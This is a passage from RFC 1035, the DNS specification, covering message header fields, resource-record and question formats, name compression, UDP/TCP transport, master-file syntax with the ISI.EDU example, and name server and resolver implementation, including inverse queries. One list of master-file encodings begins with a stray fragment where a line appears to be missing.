                and copied into the response.  The values are:

                0               a standard query (QUERY)

                1               an inverse query (IQUERY)

                2               a server status request (STATUS)

                3-15            reserved for future use

AA              Authoritative Answer - this bit is valid in responses,
                and specifies that the responding name server is an
                authority for the domain name in question section.

                Note that the contents of the answer section may have
                multiple owner names because of aliases.  The AA bit



Mockapetris                                                    [Page 26]

RFC 1035        Domain Implementation and Specification    November 1987


                corresponds to the name which matches the query name, or
                the first owner name in the answer section.

TC              TrunCation - specifies that this message was truncated
                due to length greater than that permitted on the
                transmission channel.

RD              Recursion Desired - this bit may be set in a query and
                is copied into the response.  If RD is set, it directs
                the name server to pursue the query recursively.
                Recursive query support is optional.

RA              Recursion Available - this be is set or cleared in a
                response, and denotes whether recursive query support is
                available in the name server.

Z               Reserved for future use.  Must be zero in all queries
                and responses.

RCODE           Response code - this 4 bit field is set as part of
                responses.  The values have the following
                interpretation:

                0               No error condition

                1               Format error - The name server was
                                unable to interpret the query.

                2               Server failure - The name server was
                                unable to process this query due to a
                                problem with the name server.

                3               Name Error - Meaningful only for
                                responses from an authoritative name
                                server, this code signifies that the
                                domain name referenced in the query does
                                not exist.

                4               Not Implemented - The name server does
                                not support the requested kind of query.

                5               Refused - The name server refuses to
                                perform the specified operation for
                                policy reasons.  For example, a name
                                server may not wish to provide the
                                information to the particular requester,
                                or a name server may not wish to perform
                                a particular operation (e.g., zone



Mockapetris                                                    [Page 27]

RFC 1035        Domain Implementation and Specification    November 1987


                                transfer) for particular data.

                6-15            Reserved for future use.

QDCOUNT         an unsigned 16 bit integer specifying the number of
                entries in the question section.

ANCOUNT         an unsigned 16 bit integer specifying the number of
                resource records in the answer section.

NSCOUNT         an unsigned 16 bit integer specifying the number of name
                server resource records in the authority records
                section.

ARCOUNT         an unsigned 16 bit integer specifying the number of
                resource records in the additional records section.

10.3.1.4.1.2. Question section format

The question section is used to carry the "question" in most queries,
i.e., the parameters that define what is being asked.  The section
contains QDCOUNT (usually 1) entries, each of the following format:

                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                     QNAME                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     QTYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     QCLASS                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

QNAME           a domain name represented as a sequence of labels, where
                each label consists of a length octet followed by that
                number of octets.  The domain name terminates with the
                zero length octet for the null label of the root.  Note
                that this field may be an odd number of octets; no
                padding is used.

QTYPE           a two octet code which specifies the type of the query.
                The values for this field include all codes valid for a
                TYPE field, together with some more general codes which
                can match more than one type of RR.



Mockapetris                                                    [Page 28]

RFC 1035        Domain Implementation and Specification    November 1987


QCLASS          a two octet code that specifies the class of the query.
                For example, the QCLASS field is IN for the Internet.

10.3.1.4.1.3. Resource record format

The answer, authority, and additional sections all share the same
format: a variable number of resource records, where the number of
records is specified in the corresponding count field in the header.
Each resource record has the following format:
                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                                               /
    /                      NAME                     /
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     CLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TTL                      |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                   RDLENGTH                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
    /                     RDATA                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

NAME            a domain name to which this resource record pertains.

TYPE            two octets containing one of the RR type codes.  This
                field specifies the meaning of the data in the RDATA
                field.

CLASS           two octets which specify the class of the data in the
                RDATA field.

TTL             a 32 bit unsigned integer that specifies the time
                interval (in seconds) that the resource record may be
                cached before it should be discarded.  Zero values are
                interpreted to mean that the RR can only be used for the
                transaction in progress, and should not be cached.





Mockapetris                                                    [Page 29]

RFC 1035        Domain Implementation and Specification    November 1987


RDLENGTH        an unsigned 16 bit integer that specifies the length in
                octets of the RDATA field.

RDATA           a variable length string of octets that describes the
                resource.  The format of this information varies
                according to the TYPE and CLASS of the resource record.
                For example, the if the TYPE is A and the CLASS is IN,
                the RDATA field is a 4 octet ARPA Internet address.

10.3.1.4.1.4. Message compression

In order to reduce the size of messages, the domain system utilizes a
compression scheme which eliminates the repetition of domain names in a
message.  In this scheme, an entire domain name or a list of labels at
the end of a domain name is replaced with a pointer to a prior occurance
of the same name.

The pointer takes the form of a two octet sequence:

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    | 1  1|                OFFSET                   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

The first two bits are ones.  This allows a pointer to be distinguished
from a label, since the label must begin with two zero bits because
labels are restricted to 63 octets or less.  (The 10 and 01 combinations
are reserved for future use.)  The OFFSET field specifies an offset from
the start of the message (i.e., the first octet of the ID field in the
domain header).  A zero offset specifies the first byte of the ID field,
etc.

The compression scheme allows a domain name in a message to be
represented as either:

   - a sequence of labels ending in a zero octet

   - a pointer

   - a sequence of labels ending with a pointer

Pointers can only be used for occurances of a domain name where the
format is not class specific.  If this were not the case, a name server
or resolver would be required to know the format of all RRs it handled.
As yet, there are no such cases, but they may occur in future RDATA
formats.

If a domain name is contained in a part of the message subject to a
length field (such as the RDATA section of an RR), and compression is



Mockapetris                                                    [Page 30]

RFC 1035        Domain Implementation and Specification    November 1987


used, the length of the compressed name is used in the length
calculation, rather than the length of the expanded name.

Programs are free to avoid using pointers in messages they generate,
although this will reduce datagram capacity, and may cause truncation.
However all programs are required to understand arriving messages that
contain pointers.

For example, a datagram might need to use the domain names F.ISI.ARPA,
FOO.F.ISI.ARPA, ARPA, and the root.  Ignoring the other fields of the
message, these domain names might be represented as:

       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    20 |           1           |           F           |
       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    22 |           3           |           I           |
       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    24 |           S           |           I           |
       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    26 |           4           |           A           |
       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    28 |           R           |           P           |
       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    30 |           A           |           0           |
       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    40 |           3           |           F           |
       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    42 |           O           |           O           |
       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    44 | 1  1|                20                       |
       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    64 | 1  1|                26                       |
       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    92 |           0           |                       |
       +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

The domain name for F.ISI.ARPA is shown at offset 20.  The domain name
FOO.F.ISI.ARPA is shown at offset 40; this definition uses a pointer to
concatenate a label for FOO to the previously defined F.ISI.ARPA.  The
domain name ARPA is defined at offset 64 using a pointer to the ARPA
component of the name F.ISI.ARPA at 20; note that this pointer relies on
ARPA being the last label in the string at 20.  The root domain name is



Mockapetris                                                    [Page 31]

RFC 1035        Domain Implementation and Specification    November 1987


defined by a single octet of zeros at 92; the root domain name has no
labels.

10.3.1.4.2. Transport

The DNS assumes that messages will be transmitted as datagrams or in a
byte stream carried by a virtual circuit.  While virtual circuits can be
used for any DNS activity, datagrams are preferred for queries due to
their lower overhead and better performance.  Zone refresh activities
must use virtual circuits because of the need for reliable transfer.

The Internet supports name server access using TCP [RFC-793] on server
port 53 (decimal) as well as datagram access using UDP [RFC-768] on UDP
port 53 (decimal).

10.3.1.4.2.1. UDP usage

Messages sent using UDP user server port 53 (decimal).

Messages carried by UDP are restricted to 512 bytes (not counting the IP
or UDP headers).  Longer messages are truncated and the TC bit is set in
the header.

UDP is not acceptable for zone transfers, but is the recommended method
for standard queries in the Internet.  Queries sent using UDP may be
lost, and hence a retransmission strategy is required.  Queries or their
responses may be reordered by the network, or by processing in name
servers, so resolvers should not depend on them being returned in order.

The optimal UDP retransmission policy will vary with performance of the
Internet and the needs of the client, but the following are recommended:

   - The client should try other servers and server addresses
     before repeating a query to a specific address of a server.

   - The retransmission interval should be based on prior
     statistics if possible.  Too aggressive retransmission can
     easily slow responses for the community at large.  Depending
     on how well connected the client is to its expected servers,
     the minimum retransmission interval should be 2-5 seconds.

More suggestions on server selection and retransmission policy can be
found in the resolver section of this memo.

10.3.1.4.2.2. TCP usage

Messages sent over TCP connections use server port 53 (decimal).  The
message is prefixed with a two byte length field which gives the message



Mockapetris                                                    [Page 32]

RFC 1035        Domain Implementation and Specification    November 1987


length, excluding the two byte length field.  This length field allows
the low-level processing to assemble a complete message before beginning
to parse it.

Several connection management policies are recommended:

   - The server should not block other activities waiting for TCP
     data.

   - The server should support multiple connections.

   - The server should assume that the client will initiate
     connection closing, and should delay closing its end of the
     connection until all outstanding client requests have been
     satisfied.

   - If the server needs to close a dormant connection to reclaim
     resources, it should wait until the connection has been idle
     for a period on the order of two minutes.  In particular, the
     server should allow the SOA and AXFR request sequence (which
     begins a refresh operation) to be made on a single connection.
     Since the server would be unable to answer queries anyway, a
     unilateral close or reset may be used instead of a graceful
     close.

10.3.1.5. MASTER FILES

Master files are text files that contain RRs in text form.  Since the
contents of a zone can be expressed in the form of a list of RRs a
master file is most often used to define a zone, though it can be used
to list a cache's contents.  Hence, this section first discusses the
format of RRs in a master file, and then the special considerations when
a master file is used to create a zone in some name server.

10.3.1.5.1. Format

The format of these files is a sequence of entries.  Entries are
predominantly line-oriented, though parentheses can be used to continue
a list of items across a line boundary, and text literals can contain
CRLF within the text.  Any combination of tabs and spaces act as a
delimiter between the separate items that make up an entry.  The end of
any line in the master file can end with a comment.  The comment starts
with a ";" (semicolon).

The following entries are defined:

    <blank>[<comment>]




Mockapetris                                                    [Page 33]

RFC 1035        Domain Implementation and Specification    November 1987


    $ORIGIN <domain-name> [<comment>]

    $INCLUDE <file-name> [<domain-name>] [<comment>]

    <domain-name><rr> [<comment>]

    <blank><rr> [<comment>]

Blank lines, with or without comments, are allowed anywhere in the file.

Two control entries are defined: $ORIGIN and $INCLUDE.  $ORIGIN is
followed by a domain name, and resets the current origin for relative
domain names to the stated name.  $INCLUDE inserts the named file into
the current file, and may optionally specify a domain name that sets the
relative domain name origin for the included file.  $INCLUDE may also
have a comment.  Note that a $INCLUDE entry never changes the relative
origin of the parent file, regardless of changes to the relative origin
made within the included file.

The last two forms represent RRs.  If an entry for an RR begins with a
blank, then the RR is assumed to be owned by the last stated owner.  If
an RR entry begins with a <domain-name>, then the owner name is reset.

<rr> contents take one of the following forms:

    [<TTL>] [<class>] <type> <RDATA>

    [<class>] [<TTL>] <type> <RDATA>

The RR begins with optional TTL and class fields, followed by a type and
RDATA field appropriate to the type and class.  Class and type use the
standard mnemonics, TTL is a decimal integer.  Omitted class and TTL
values are default to the last explicitly stated values.  Since type and
class mnemonics are disjoint, the parse is unique.  (Note that this
order is different from the order used in examples and the order used in
the actual RRs; the given order allows easier parsing and defaulting.)

<domain-name>s make up a large share of the data in the master file.
The labels in the domain name are expressed as character strings and
separated by dots.  Quoting conventions allow arbitrary characters to be
stored in domain names.  Domain names that end in a dot are called
absolute, and are taken as complete.  Domain names which do not end in a
dot are called relative; the actual domain name is the concatenation of
the relative part with an origin specified in a $ORIGIN, $INCLUDE, or as
an argument to the master file loading routine.  A relative name is an
error when no origin is available.





Mockapetris                                                    [Page 34]

RFC 1035        Domain Implementation and Specification    November 1987


<character-string> is expressed in one or two ways: as a contiguous set
of characters without interior spaces, or as a string beginning with a "
and ending with a ".  Inside a " delimited string any character can
occur, except for a " itself, which must be quoted using \ (back slash).

Because these files are text files several special encodings are
necessary to allow arbitrary data to be loaded.  In particular:

                of the root.

@               A free standing @ is used to denote the current origin.

\X              where X is any character other than a digit (0-9), is
                used to quote that character so that its special meaning
                does not apply.  For example, "\." can be used to place
                a dot character in a label.

\DDD            where each D is a digit is the octet corresponding to
                the decimal number described by DDD.  The resulting
                octet is assumed to be text and is not checked for
                special meaning.

( )             Parentheses are used to group data that crosses a line
                boundary.  In effect, line terminations are not
                recognized within parentheses.

;               Semicolon is used to start a comment; the remainder of
                the line is ignored.

10.3.1.5.2. Use of master files to define zones

When a master file is used to load a zone, the operation should be
suppressed if any errors are encountered in the master file.  The
rationale for this is that a single error can have widespread
consequences.  For example, suppose that the RRs defining a delegation
have syntax errors; then the server will return authoritative name
errors for all names in the subzone (except in the case where the
subzone is also present on the server).

Several other validity checks that should be performed in addition to
insuring that the file is syntactically correct:

|   1. All RRs in the file should have the same class.
|
|   2. Exactly one SOA RR should be present at the top of the zone.
|
|   3. If delegations are present and glue information is required,
|      it should be present.



Mockapetris                                                    [Page 35]

RFC 1035        Domain Implementation and Specification    November 1987


|   4. Information present outside of the authoritative nodes in the
      zone should be glue information, rather than the result of an
      origin or similar error.

10.3.1.5.3. Master file example

The following is an example file which might be used to define the
ISI.EDU zone.and is loaded with an origin of ISI.EDU:

@   IN  SOA     VENERA      Action\.domains (
                                 20     ; SERIAL
                                 7200   ; REFRESH
                                 600    ; RETRY
                                 3600000; EXPIRE
                                 60)    ; MINIMUM

        NS      A.ISI.EDU.
        NS      VENERA
        NS      VAXA
        MX      10      VENERA
        MX      20      VAXA

A       A       26.3.0.103

VENERA  A       10.1.0.52
        A       128.9.0.32

VAXA    A       10.2.0.27
        A       128.9.0.33


$INCLUDE <SUBSYS>ISI-MAILBOXES.TXT

Where the file <SUBSYS>ISI-MAILBOXES.TXT is:

    MOE     MB      A.ISI.EDU.
    LARRY   MB      A.ISI.EDU.
    CURLEY  MB      A.ISI.EDU.
    STOOGES MG      MOE
            MG      LARRY
            MG      CURLEY

Note the use of the \ character in the SOA RR to specify the responsible
person mailbox "Action.domains@E.ISI.EDU".







Mockapetris                                                    [Page 36]

RFC 1035        Domain Implementation and Specification    November 1987


10.3.1.6. NAME SERVER IMPLEMENTATION

10.3.1.6.1. Architecture

The optimal structure for the name server will depend on the host
operating system and whether the name server is integrated with resolver
operations, either by supporting recursive service, or by sharing its
database with a resolver.  This section discusses implementation
considerations for a name server which shares a database with a
resolver, but most of these concerns are present in any name server.

10.3.1.6.1.1. Control

A name server must employ multiple concurrent activities, whether they
are implemented as separate tasks in the host's OS or multiplexing
inside a single name server program.  It is simply not acceptable for a
name server to block the service of UDP requests while it waits for TCP
data for refreshing or query activities.  Similarly, a name server
should not attempt to provide recursive service without processing such
requests in parallel, though it may choose to serialize requests from a
single client, or to regard identical requests from the same client as
duplicates.  A name server should not substantially delay requests while
it reloads a zone from master files or while it incorporates a newly
refreshed zone into its database.

10.3.1.6.1.2. Database

While name server implementations are free to use any internal data
structures they choose, the suggested structure consists of three major
parts:

   - A "catalog" data structure which lists the zones available to
     this server, and a "pointer" to the zone data structure.  The
     main purpose of this structure is to find the nearest ancestor
     zone, if any, for arriving standard queries.

   - Separate data structures for each of the zones held by the
     name server.

   - A data structure for cached data. (or perhaps separate caches
     for different classes)

All of these data structures can be implemented an identical tree
structure format, with different data chained off the nodes in different
parts: in the catalog the data is pointers to zones, while in the zone
and cache data structures, the data will be RRs.  In designing the tree
framework the designer should recognize that query processing will need
to traverse the tree using case-insensitive label comparisons; and that



Mockapetris                                                    [Page 37]

RFC 1035        Domain Implementation and Specification    November 1987


in real data, a few nodes have a very high branching factor (100-1000 or
more), but the vast majority have a very low branching factor (0-1).

One way to solve the case problem is to store the labels for each node
in two pieces: a standardized-case representation of the label where all
ASCII characters are in a single case, together with a bit mask that
denotes which characters are actually of a different case.  The
branching factor diversity can be handled using a simple linked list for
a node until the branching factor exceeds some threshold, and
transitioning to a hash structure after the threshold is exceeded.  In
any case, hash structures used to store tree sections must insure that
hash functions and procedures preserve the casing conventions of the
DNS.

The use of separate structures for the different parts of the database
is motivated by several factors:

   - The catalog structure can be an almost static structure that
     need change only when the system administrator changes the
     zones supported by the server.  This structure can also be
     used to store parameters used to control refreshing
     activities.

   - The individual data structures for zones allow a zone to be
     replaced simply by changing a pointer in the catalog.  Zone
     refresh operations can build a new structure and, when
     complete, splice it into the database via a simple pointer
     replacement.  It is very important that when a zone is
     refreshed, queries should not use old and new data
     simultaneously.

   - With the proper search procedures, authoritative data in zones
     will always "hide", and hence take precedence over, cached
     data.

   - Errors in zone definitions that cause overlapping zones, etc.,
     may cause erroneous responses to queries, but problem
     determination is simplified, and the contents of one "bad"
     zone can't corrupt another.

   - Since the cache is most frequently updated, it is most
     vulnerable to corruption during system restarts.  It can also
     become full of expired RR data.  In either case, it can easily
     be discarded without disturbing zone data.

A major aspect of database design is selecting a structure which allows
the name server to deal with crashes of the name server's host.  State
information which a name server should save across system crashes



Mockapetris                                                    [Page 38]

RFC 1035        Domain Implementation and Specification    November 1987


includes the catalog structure (including the state of refreshing for
each zone) and the zone data itself.

10.3.1.6.1.3. Time

Both the TTL data for RRs and the timing data for refreshing activities
depends on 32 bit timers in units of seconds.  Inside the database,
refresh timers and TTLs for cached data conceptually "count down", while
data in the zone stays with constant TTLs.

A recommended implementation strategy is to store time in two ways:  as
a relative increment and as an absolute time.  One way to do this is to
use positive 32 bit numbers for one type and negative numbers for the
other.  The RRs in zones use relative times; the refresh timers and
cache data use absolute times.  Absolute numbers are taken with respect
to some known origin and converted to relative values when placed in the
response to a query.  When an absolute TTL is negative after conversion
to relative, then the data is expired and should be ignored.

10.3.1.6.2. Standard query processing

The major algorithm for standard query processing is presented in
[RFC-1034].

When processing queries with QCLASS=*, or some other QCLASS which
matches multiple classes, the response should never be authoritative
unless the server can guarantee that the response covers all classes.

When composing a response, RRs which are to be inserted in the
additional section, but duplicate RRs in the answer or authority
sections, may be omitted from the additional section.

When a response is so long that truncation is required, the truncation
should start at the end of the response and work forward in the
datagram.  Thus if there is any data for the authority section, the
answer section is guaranteed to be unique.

The MINIMUM value in the SOA should be used to set a floor on the TTL of
data distributed from a zone.  This floor function should be done when
the data is copied into a response.  This will allow future dynamic
update protocols to change the SOA MINIMUM field without ambiguous
semantics.

10.3.1.6.3. Zone refresh and reload processing

In spite of a server's best efforts, it may be unable to load zone data
from a master file due to syntax errors, etc., or be unable to refresh a
zone within the its expiration parameter.  In this case, the name server



Mockapetris                                                    [Page 39]

RFC 1035        Domain Implementation and Specification    November 1987


should answer queries as if it were not supposed to possess the zone.

If a master is sending a zone out via AXFR, and a new version is created
during the transfer, the master should continue to send the old version
if possible.  In any case, it should never send part of one version and
part of another.  If completion is not possible, the master should reset
the connection on which the zone transfer is taking place.

10.3.1.6.4. Inverse queries (Optional)

Inverse queries are an optional part of the DNS.  Name servers are not
required to support any form of inverse queries.  If a name server
receives an inverse query that it does not support, it returns an error
response with the "Not Implemented" error set in the header.  While
inverse query support is optional, all name servers must be at least
able to return the error response.

10.3.1.6.4.1. The contents of inverse queries and responses          Inverse
queries reverse the mappings performed by standard query operations;
while a standard query maps a domain name to a resource, an inverse
query maps a resource to a domain name.  For example, a standard query
might bind a domain name to a host address; the corresponding inverse
query binds the host address to a domain name.

Inverse queries take the form of a single RR in the answer section of
the message, with an empty question section.  The owner name of the
query RR and its TTL are not significant.  The response carries
questions in the question section which identify all names possessing
the query RR WHICH THE NAME SERVER KNOWS.  Since no name server knows
about all of the domain name space, the response can never be assumed to
be complete.  Thus inverse queries are primarily useful for database
management and debugging activities.  Inverse queries are NOT an
acceptable method of mapping host addresses to host names; use the IN-
ADDR.ARPA domain instead.

Where possible, name servers should provide case-insensitive comparisons
for inverse queries.  Thus an inverse query asking for an MX RR of
"Venera.isi.edu" should get the same response as a query for
"VENERA.ISI.EDU"; an inverse query for HINFO RR "IBM-PC UNIX" should
produce the same result as an inverse query for "IBM-pc unix".  However,
this cannot be guaranteed because name servers may possess RRs that
contain character strings but the name server does not know that the
data is character.

When a name server processes an inverse query, it either returns:

   1. zero, one, or multiple domain names for the specified
      resource as QNAMEs in the question section



Mockapetris                                                    [Page 40]

RFC 1035        Domain Implementation and Specification    November 1987


   2. an error code indicating that the name server doesn't support
      inverse mapping of the specified resource type.

When the response to an inverse query contains one or more QNAMEs, the
owner name and TTL of the RR in the answer section which defines the
inverse query is modified to exactly match an RR found at the first
QNAME.

RRs returned in the inverse queries cannot be cached using the same
mechanism as is used for the replies to standard queries.  One reason
for this is that a name might have multiple RRs of the same type, and
only one would appear.  For example, an inverse query for a single
address of a multiply homed host might create the impression that only
one address existed.

10.3.1.6.4.2. Inverse query and response example          The overall structure
of an inverse query for retrieving the domain name that corresponds to
Internet address 10.1.0.52 is shown below:

                         +-----------------------------------------+
           Header        |          OPCODE=IQUERY, ID=997          |
                         +-----------------------------------------+
          Question       |                 <empty>                 |
                         +-----------------------------------------+
           Answer        |        <anyname> A IN 10.1.0.52         |
                         +-----------------------------------------+
          Authority      |                 <empty>                 |
                         +-----------------------------------------+
         Additional      |                 <empty>                 |
                         +-----------------------------------------+

This query asks for a question whose answer is the Internet style
address 10.1.0.52.  Since the owner name is not known, any domain name
can be used as a placeholder (and is ignored).  A single octet of zero,
signifying the root, is usually used because it minimizes the length of
the message.  The TTL of the RR is not significant.  The response to
this query might be:














Mockapetris                                                    [Page 41]

RFC 1035        Domain Implementation and Specification    November 1987


                         +-----------------------------------------+
           Header        |         OPCODE=RESPONSE, ID=997         |
                         +-----------------------------------------+
          Question       |QTYPE=A, QCLASS=IN, QNAME=VENERA.ISI.EDU |
                         +-----------------------------------------+
           Answer        |  VENERA.ISI.EDU  A IN 10.1.0.52         |
                         +-----------------------------------------+
          Authority      |                 <empty>                 |
                         +-----------------------------------------+
         Additional      |                 <empty>                 |
                         +-----------------------------------------+

Note that the QTYPE in a response to an inverse query is the same as the
TYPE field in the answer section of the inverse query.  Responses to
inverse queries may contain multiple questions when the inverse is not
unique.  If the question section in the response is not empty, then the
RR in the answer section is modified to correspond to be an exact copy
of an RR at the first QNAME.

10.3.1.6.4.3. Inverse query processing

Name servers that support inverse queries can support these operations
through exhaustive searches of their databases, but this becomes
impractical as the size of the database increases.  An alternative
approach is to invert the database according to the search key.

For name servers that support multiple zones and a large amount of data,
the recommended approach is separate inversions for each zone.  When a
particular zone is changed during a refresh, only its inversions need to
be redone.

Support for transfer of this type of inversion may be included in future
versions of the domain system, but is not supported in this version.

10.3.1.6.5. Completion queries and responses

The optional completion services described in RFC-882 and RFC-883 have
been deleted.  Redesigned services may become available in the future.













Mockapetris                                                    [Page 42]

RFC 1035        Domain Implementation and Specification    November 1987


10.3.1.7. RESOLVER IMPLEMENTATION

The top levels of the recommended resolver algorithm are discussed in
[RFC-1034].  This section discusses implementation details assuming the
database structure suggested in the name server implementation section
of this memo.

10.3.1.7.1. Transforming a user request into a query

The first step a resolver takes is to transform the client's request,
stated in a format suitable to the local OS, into a search specification
for RRs at a specific name which match a specific QTYPE and QCLASS.
Where possible, the QTYPE and QCLASS should correspond to a single type
and a single class, because this makes the use of cached data much
simpler.  The reason for this is that the presence of data of one type
in a cache doesn't confirm the existence or non-existence of data of
other types, hence the only way to be sure is to consult an
authoritative source.  If QCLASS=* is used, then authoritative answers
won't be available.

Since a resolver must be able to multiplex multiple requests if it is to
perform its function efficiently, each pending request is usually
represented in some block of state information.  This state block will
typically contain:

   - A timestamp indicating the time the request began.
     The timestamp is used to decide whether RRs in the database
     can be used or are out of date.  This timestamp uses the
     absolute time format previously discussed for RR storage in
     zones and caches.  Note that when an RRs TTL indicates a
     relative time, the RR must be timely, since it is part of a
     zone.  When the RR has an absolute time, it is part of a
     cache, and the TTL of the RR is compared against the timestamp
     for the start of the request.

     Note that using the timestamp is superior to using a current
     time, since it allows RRs with TTLs of zero to be entered in
     the cache in the usual manner, but still used by the current
     request, even after intervals of many seconds due to system
     load, query retransmission timeouts, etc.

   - Some sort of parameters to limit the amount of work which will
     be performed for this request.

     The amount of work which a resolver will do in response to a
     client request must be limited to guard against errors in the
     database, such as circular CNAME references, and operational
     problems, such as network partition which prevents the



Mockapetris                                                    [Page 43]

RFC 1035        Domain Implementation and Specification    November 1987


     resolver from accessing the name servers it needs.  While
     local limits on the number of times a resolver will retransmit
     a particular query to a particular name server address are
     essential, the resolver should have a global per-request
     counter to limit work on a single request.  The counter should
     be set to some initial value and decremented whenever the
     resolver performs any action (retransmission timeout,
     retransmission, etc.)  If the counter passes zero, the request
     is terminated with a temporary error.

     Note that if the resolver structure allows one request to
     start others in parallel, such as when the need to access a
     name server for one request causes a parallel resolve for the
     name server's addresses, the spawned request should be started
     with a lower counter.  This prevents circular references in
     the database from starting a chain reaction of resolver
     activity.

   - The SLIST data structure discussed in [RFC-1034].

     This structure keeps track of the state of a request if it
     must wait for answers from foreign name servers.

10.3.1.7.2. Sending the queries

As described in [RFC-1034], the basic task of the resolver is to
formulate a query which will answer the client's request and direct that
query to name servers which can provide the information.  The resolver
will usually only have very strong hints about which servers to ask, in
the form of NS RRs, and may have to revise the query, in response to
CNAMEs, or revise the set of name servers the resolver is asking, in
response to delegation responses which point the resolver to name
servers closer to the desired information.  In addition to the
information requested by the client, the resolver may have to call upon
its own services to determine the address of name servers it wishes to
contact.

In any case, the model used in this memo assumes that the resolver is
multiplexing attention between multiple requests, some from the client,
and some internally generated.  Each request is represented by some
state information, and the desired behavior is that the resolver
transmit queries to name servers in a way that maximizes the probability
that the request is answered, minimizes the time that the request takes,
and avoids excessive transmissions.  The key algorithm uses the state
information of the request to select the next name server address to
query, and also computes a timeout which will cause the next action
should a response not arrive.  The next action will usually be a
transmission to some other server, but may be a temporary error to the



Mockapetris                                                    [Page 44]

RFC 1035        Domain Implementation and Specification    November 1987


client.

The resolver always starts with a list of server names to query (SLIST).
This list will be all NS RRs which correspond to the nearest ancestor
zone that the resolver knows about.  To avoid startup problems, the
resolver should have a set of default servers which it will ask should
it have no current NS RRs which are appropriate.  The resolver then adds
to SLIST all of the known addresses for the name servers, and may start
parallel requests to acquire the addresses of the servers when the
resolver has the name, but no addresses, for the name servers.

To complete initialization of SLIST, the resolver attaches whatever
history information it has to the each address in SLIST.  This will
usually consist of some sort of weighted averages for the response time
of the address, and the batting average of the address (i.e., how often
the address responded at all to the request).  Note that this
information should be kept on a per address basis, rather than on a per
name server basis, because the response time and batting average of a
particular server may vary considerably from address to address.  Note
also that this information is actually specific to a resolver address /
server address pair, so a resolver with multiple addresses may wish to
keep separate histories for each of its addresses.  Part of this step
must deal with addresses which have no such history; in this case an
expected round trip time of 5-10 seconds should be the worst case, with
lower estimates for the same local network, etc.

Note that whenever a delegation is followed, the resolver algorithm
reinitializes SLIST.

The information establishes a partial ranking of the available name
server addresses.  Each time an address is chosen and the state should
be altered to prevent its selection again until all other addresses have
been tried.  The timeout for each transmission should be 50-100% greater
than the average predicted value to allow for variance in response.

Some fine points:

   - The resolver may encounter a situation where no addresses are
     available for any of the name servers named in SLIST, and
     where the servers in the list are precisely those which would
     normally be used to look up their own addresses.  This
     situation typically occurs when the glue address RRs have a
     smaller TTL than the NS RRs marking delegation, or when the
     resolver caches the result of a NS search.  The resolver
     should detect this condition and restart the search at the
     next ancestor zone, or alternatively at the root.





Mockapetris                                                    [Page 45]

RFC 1035        Domain Implementation and Specification    November 1987


   - If a resolver gets a server error or other bizarre response
     from a name server, it should remove it from SLIST, and may
     wish to schedule an immediate transmission to the next
     candidate server address.

10.3.1.7.3. Processing responses

The first step in processing arriving response datagrams is to parse the
response.  This procedure should include:

   - Check the header for reasonableness.  Discard datagrams which
     are queries when responses are expected.

   - Parse the sections of the message, and insure that all RRs are
     correctly formatted.

   - As an optional step, check the TTLs of arriving data looking
     for RRs with excessively long TTLs.  If a RR has an
     excessively long TTL, say greater than 1 week, either discard
     the whole response, or limit all TTLs in the response to 1
     week.

The next step is to match the response to a current resolver request.
The recommended strategy is to do a preliminary matching using the ID
field in the domain header, and then to verify that the question section
corresponds to the information currently desired.  This requires that
the transmission algorithm devote several bits of the domain ID field to
a request identifier of some sort.  This step has several fine points:

   - Some name servers send their responses from different
     addresses than the one used to receive the query.  That is, a
     resolver cannot rely that a response will come from the same
     address which it sent the corresponding query to.  This name
     server bug is typically encountered in UNIX systems.

   - If the resolver retransmits a particular request to a name
     server it should be able to use a response from any of the
     transmissions.  However, if it is using the response to sample
     the round trip time to access the name server, it must be able
     to determine which transmission matches the response (and keep
     transmission times for each outgoing message), or only
     calculate round trip times based on initial transmissions.

   - A name server will occasionally not have a current copy of a
     zone which it should have according to some NS RRs.  The
     resolver should simply remove the name server from the current
     SLIST, and continue.




Mockapetris                                                    [Page 46]

RFC 1035        Domain Implementation and Specification    November 1987


10.3.1.7.4. Using the cache

In general, we expect a resolver to cache all data which it receives in
responses since it may be useful in answering future client requests.
However, there are several types of data which should not be cached:

   - When several RRs of the same type are available for a
     particular owner name, the resolver should either cache them
     all or none at all.  When a response is truncated, and a
     resolver doesn't know whether it has a complete set, it should
     not cache a possibly partial set of RRs.

   - Cached data should never be used in preference to
     authoritative data, so if caching would cause this to happen
     the data should not be cached.

   - The results of an inverse query should not be cached.

   - The results of standard queries where the QNAME contains "*"
